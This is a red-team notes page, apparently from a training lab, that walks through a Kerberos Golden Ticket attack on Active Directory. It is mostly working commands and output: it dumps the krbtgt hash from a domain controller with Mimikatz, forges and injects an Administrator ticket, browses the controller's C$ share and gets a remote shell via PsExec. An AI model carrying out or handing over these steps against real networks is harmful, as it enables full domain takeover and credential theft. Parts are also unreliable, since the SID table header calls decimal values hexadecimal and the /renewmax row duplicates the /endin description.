---
description: >-
  The Golden Ticket is the Kerberos authentication token for the KRBTGT account,
  a special hidden account with the job of encrypting all the authentication
  tokens for the DC.
---

# Golden Ticket

## Tickets flow:

![](../../.gitbook/assets/image%20%284%29.png)

### Golden Tickets with explanation:

![](../../.gitbook/assets/image%20%289%29.png)

## Attack

### Dump Hashes on Domain Contorller

Use mimikatz:

```text
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

Look for "**krbtgt**" user in output:

```text
 .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch

...

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

...
```

### Create TGT \(Golded Ticket\)

mimikatz \(admin privs required\)

```text
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

|  |  |
| :--- | :--- |
| **/user** | Username for which the TGT is generated |
| **/domain** | Domain FQDN |
| **/sid** | SID of the domain |
| **/krbtgt** | NTLM \(RC4\) hash of the krbtgt account. |
| **/id** | Optional User RID \(default 500\) |
| **/groups** | Optional Group RID \(default 512 513 518 519 520\) |
| **/startoffset** | Optional when the ticket is available \(default 0 - right now\) in minutes. Use negative for a ticket available from past and a larger number for future. |
| **/endin** | Optional ticket lifetime \(default is 10 years\) in minutes. The default AD setting is 10 hours = 600 minutes |
| **/renewmax** | Optional ticket lifetime \(default is 10 years\) in minutes. The default AD setting is 10 hours = 600 minutes |
| **/ptt** | Inject the ticket in current PowerShell process \(use **/ticket** for saving into file\) |

### Verify tickets

```text
PS C:\AD> klist

Current LogonId is 0:0x14ec040

Cached Tickets: (1)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: krbtgt/dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 9/27/2020 10:32:32 (local)
        End Time:   9/27/2020 20:32:32 (local)
        Renew Time: 10/4/2020 10:32:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

### Requesting services

It is possible to request services on remote machine now.

#### CIFS - list files

```text
PS C:\AD\Tools\mimikatz_trunk\x64> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        8/20/2020   2:05 AM                Windows
```

#### PSExec

```text
PS C:\AD\Tools>  .\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
dollarcorp\administrator
```

## Well-known Security Identifiers **\(S-1-5-21domain\)**

| Property flag | Value in hexadecimal |
| :--- | :--- |
| 500 | Administrator |
| 501 | Guest |
| 502 | KRBTGT |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |

